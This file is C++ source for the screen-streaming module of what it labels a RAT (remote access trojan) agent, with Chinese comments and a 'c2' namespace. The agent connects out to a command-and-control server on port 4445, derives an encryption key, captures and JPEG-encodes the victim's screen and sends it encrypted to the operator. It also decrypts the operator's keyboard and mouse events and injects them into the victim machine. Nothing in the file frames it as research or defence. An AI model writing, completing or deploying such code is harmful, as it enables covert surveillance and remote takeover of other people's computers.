// screen_stream.cpp — 屏幕流长连接实现（协议 §9）
// Agent 收到 RMT_SCREEN_STREAM 后外连 c2server:4445：
//   握手(StreamHello/Ack) → 派生 stream_key → 帧循环(抓屏+JPEG+加密上行)
//   + 输入事件接收(解密 → SendInput 注入)
#include "screen_stream.h"

#include "crypto.h"
#include "desktop_switch.h"
#include "input_replay.h"
#include "net.h"
#include "protocol.h"
#include "screen_spy.h"
#include "session.h"

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <bcrypt.h>
#include <wincodec.h>
#include <wrl/client.h>

#include <atomic>
#include <cstdio>
#include <cstring>
#include <process.h>
#include <string>
#include <vector>

namespace c2 {

namespace {

using Microsoft::WRL::ComPtr;

std::string g_host;
AgentConfig g_cfg;
std::atomic<bool> g_running{false};
float g_stream_scale = 1.0f;  // 抓屏缩放（帧尺寸 = 屏幕 × scale）
HANDLE g_thread = nullptr;

// ---- JPEG 编码（WIC，BGRA → JPEG 内存）----

bool encode_jpeg_bgra(int w, int h, int stride, const uint8_t* px, int quality,
                      std::vector<uint8_t>& out) {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    bool needUninit = SUCCEEDED(hr);
    if (hr == RPC_E_CHANGED_MODE)
        needUninit = false;

    {
        ComPtr<IWICImagingFactory> factory;
        if (FAILED(CoCreateInstance(CLSID_WICImagingFactory, nullptr,
                                    CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&factory)))) {
            if (needUninit) CoUninitialize();
            return false;
        }

        ComPtr<IWICBitmap> bitmap;
        if (FAILED(factory->CreateBitmapFromMemory(w, h, GUID_WICPixelFormat32bppBGRA,
                                                   stride, (UINT)stride * h,
                                                   const_cast<BYTE*>(px),
                                                   &bitmap))) {
            if (needUninit) CoUninitialize();
            return false;
        }

        HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, 0);
        ComPtr<IStream> stream;
        CreateStreamOnHGlobal(hg, TRUE, &stream);

        ComPtr<IWICStream> wicStream;
        factory->CreateStream(&wicStream);
        wicStream->InitializeFromIStream(stream.Get());

        ComPtr<IWICBitmapEncoder> encoder;
        if (FAILED(factory->CreateEncoder(GUID_ContainerFormatJpeg, nullptr, &encoder)) ||
            FAILED(encoder->Initialize(wicStream.Get(), WICBitmapEncoderNoCache))) {
            if (needUninit) CoUninitialize();
            return false;
        }
        ComPtr<IWICBitmapFrameEncode> frame;
        if (FAILED(encoder->CreateNewFrame(&frame, nullptr)) ||
            FAILED(frame->Initialize(nullptr))) {
            if (needUninit) CoUninitialize();
            return false;
        }

        if (FAILED(frame->WriteSource(bitmap.Get(), nullptr)) ||
            FAILED(frame->Commit()) || FAILED(encoder->Commit())) {
            if (needUninit) CoUninitialize();
            return false;
        }
        STATSTG st{};
        stream->Stat(&st, STATFLAG_NONAME);
        ULARGE_INTEGER size = st.cbSize;
        out.resize((size_t)size.QuadPart);
        ULONG read = 0;
        stream->Seek({0, 0}, STREAM_SEEK_SET, nullptr);
        stream->Read(out.data(), (ULONG)out.size(), &read);
        out.resize(read);
    }  // 所有 ComPtr 在此析构

    if (needUninit) CoUninitialize();
    return !out.empty();
}

// 屏幕流线程
// 屏幕流线程：握手 → 帧循环 + 输入接收
unsigned __stdcall stream_proc(void* param) {
    (void)param;
    printf("[stream] connecting to %s:%u...\n", g_host.c_str(), kStreamPort);

    SOCKET sock = INVALID_SOCKET;
    if (!net_connect(g_host, kStreamPort, &sock, 5000)) {
        printf("[stream] connect failed\n");
        g_running.store(false);
        return 1;
    }

    // 握手（明文）：StreamHello(agent_id + client_nonce) → StreamAck(server_nonce)
    uint8_t client_nonce[kClientNonceLen];
    BCryptGenRandom(nullptr, client_nonce, kClientNonceLen,
                    BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    std::vector<uint8_t> hello(kAgentIdLen + kClientNonceLen);
    std::memcpy(hello.data(), g_cfg.agent_id, kAgentIdLen);
    std::memcpy(hello.data() + kAgentIdLen, client_nonce, kClientNonceLen);
    Header h;
    h.cmd = kCmdStreamHello;
    if (!net_write_packet(sock, h, hello.data(), hello.size())) {
        printf("[stream] send hello failed\n");
        net_close(sock);
        g_running.store(false);
        return 1;
    }
    Header ack_h;
    std::vector<uint8_t> ack;
    if (!net_read_packet(sock, ack_h, ack, 5000) || ack_h.cmd != kCmdStreamAck ||
        ack.size() < kServerNonceLen) {
        printf("[stream] handshake failed\n");
        net_close(sock);
        g_running.store(false);
        return 1;
    }
    const uint8_t* server_nonce = ack.data();
    // stream_key = HKDF(psk, agent_id||client_nonce||server_nonce, "rat-stream-v1")
    std::vector<uint8_t> salt;
    salt.insert(salt.end(), g_cfg.agent_id, g_cfg.agent_id + kAgentIdLen);
    salt.insert(salt.end(), client_nonce, client_nonce + kClientNonceLen);
    salt.insert(salt.end(), server_nonce, server_nonce + kServerNonceLen);
    std::vector<uint8_t> stream_key =
        hkdf_sha256(g_cfg.psk.data(), g_cfg.psk.size(), salt.data(), salt.size(),
                    (const uint8_t*)"rat-stream-v1", 13, kSessionKeyLen);
    printf("[stream] connected, key derived\n");

    // 帧循环（本线程内：抓屏 + 编码 + 发送；读输入在循环里轮询）
    printf("[stream] creating ScreenSpy...\n");
    ScreenSpy* spy = ScreenSpy::create(32, false, -1, -1, -1, -1, g_stream_scale);
    printf("[stream] ScreenSpy created=%p\n", (void*)spy);
    if (!spy) {
        printf("[stream] ScreenSpy create failed\n");
        net_close(sock);
        g_running.store(false);
        return 1;
    }

    uint32_t seq = 0;
    DWORD frame_interval = 1000 / 25;  // fps 由调用方传入，此处用固定 25（简化）
    uint32_t sent_frames = 0, input_events = 0;
    DWORD t0 = GetTickCount();
    while (g_running.load()) {
        // 尝试收一个输入事件包（短超时，避免阻塞帧循环）
        Header in_h;
        std::vector<uint8_t> in_raw;
        if (net_read_packet(sock, in_h, in_raw, 50)) {
            if (in_h.flags & kFlagEncrypted) {
                std::vector<uint8_t> plain;
                std::string err;
                if (aes_gcm_decrypt(stream_key.data(), stream_key.size(),
                                    in_raw.data(), in_raw.size(), plain, err) &&
                    in_h.cmd == kCmdInputEvents && plain.size() >= 4) {
                    uint32_t count = 0;
                    std::memcpy(&count, plain.data(), 4);
                    if (plain.size() >= 4 + count * sizeof(InputEvent)) {
                        input_events += count;
                        replay_input_events(
                            reinterpret_cast<const InputEvent*>(plain.data() + 4),
                            count);
                        printf("[stream] injected %u input events (total %u)\n",
                               count, input_events);
                    }
                }
            }
            continue;  // 继续收包/抓下一帧
        }

        // 抓帧 + JPEG + 发送
        if (spy->grab()) {
            std::vector<uint8_t> jpeg;
            if (encode_jpeg_bgra(spy->width(), spy->height(), spy->stride(),
                                 spy->pixels(), 70, jpeg)) {
                // 帧包明文：seq(4)+w(2)+h(2)+jpeg_len(4)+jpeg
                std::vector<uint8_t> plain;
                uint32_t w = (uint32_t)spy->width(), hh = (uint32_t)spy->height();
                for (int i = 0; i < 4; ++i) plain.push_back((uint8_t)(seq >> (8 * i)));
                plain.push_back((uint8_t)(w & 0xFF)); plain.push_back((uint8_t)(w >> 8));
                plain.push_back((uint8_t)(hh & 0xFF)); plain.push_back((uint8_t)(hh >> 8));
                uint32_t jl = (uint32_t)jpeg.size();
                for (int i = 0; i < 4; ++i) plain.push_back((uint8_t)(jl >> (8 * i)));
                plain.insert(plain.end(), jpeg.begin(), jpeg.end());

                std::vector<uint8_t> sealed;
                std::string err;
                if (aes_gcm_encrypt(stream_key.data(), stream_key.size(),
                                    plain.data(), plain.size(), sealed, err)) {
                    Header fh;
                    fh.flags = kFlagEncrypted;
                    fh.seq = seq++;
                    fh.cmd = kCmdScreenFrame;
                    if (!net_write_packet(sock, fh, sealed.data(), sealed.size())) {
                        printf("[stream] send frame #%u FAILED (conn broken)\n", seq);
                        break;
                    }
                    sent_frames++;
                    if (sent_frames == 1 || sent_frames % 25 == 0) {
                        DWORD el = GetTickCount() - t0;
                        float fps = el > 0 ? sent_frames * 1000.0f / el : 0;
                        printf("[stream] sent %u frames (%.1f fps, last jpeg=%zu B)\n",
                               sent_frames, fps, jpeg.size());
                    }
                }
            }
        }
        Sleep(frame_interval);
    }

    delete spy;
    net_close(sock);
    printf("[stream] stopped (sent=%u frames, injected=%u input events)\n",
           sent_frames, input_events);
    return 0;
}

}  // namespace

void screen_stream_set_config(const std::string& host, const AgentConfig& cfg) {
    g_host = host;
    g_cfg = cfg;
}

bool start_screen_stream(int fps, int quality, float scale) {
    (void)fps;  // 帧率简化：固定 25fps（见 stream_proc）
    (void)quality;
    g_stream_scale = (scale > 0.0f) ? scale : 1.0f;
    set_input_scale(g_stream_scale);  // 关键：注入换算与抓屏缩放对齐
    if (g_running.load()) {
        printf("[stream] start ignored: already running\n");
        return false;  // 已在运行
    }
    g_running.store(true);
    g_thread = (HANDLE)_beginthreadex(nullptr, 0, stream_proc, nullptr, 0, nullptr);
    printf("[stream] start requested (thread=%p)\n", (void*)g_thread);
    return g_thread != nullptr;
}

void stop_screen_stream() {
    printf("[stream] stop requested\n");
    g_running.store(false);
    if (g_thread) {
        WaitForSingleObject(g_thread, 5000);
        CloseHandle(g_thread);
        g_thread = nullptr;
        printf("[stream] stop done\n");
    } else {
        printf("[stream] stop: no thread running\n");
    }
}

}  // namespace c2
